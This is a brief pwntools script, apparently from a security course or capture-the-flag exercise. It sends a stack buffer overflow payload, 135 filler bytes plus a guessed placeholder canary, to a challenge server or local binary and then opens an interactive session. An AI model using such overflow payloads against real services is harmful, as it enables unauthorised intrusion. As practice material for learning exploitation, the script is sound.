from pwn import *
def interact_with_process(binary_path, host=None, port=None):
    # Start the process
    if host and port:
        p = remote(host, port)
    else:
        p = process(binary_path)

    p.recvuntil(b'AAAAw, yeah...').decode('utf-8').strip()
    payload = b"A" * 135
    canary = b"12345678"
    # padding = b"B" * 8
    payload += canary

    print(f"[*] Sending payload: {payload}")
    p.sendline(payload)
    p.interactive()


# Example usage
interact_with_process('', '6447.lol', 14860)
# interact_with_process('../w1/too-slow')
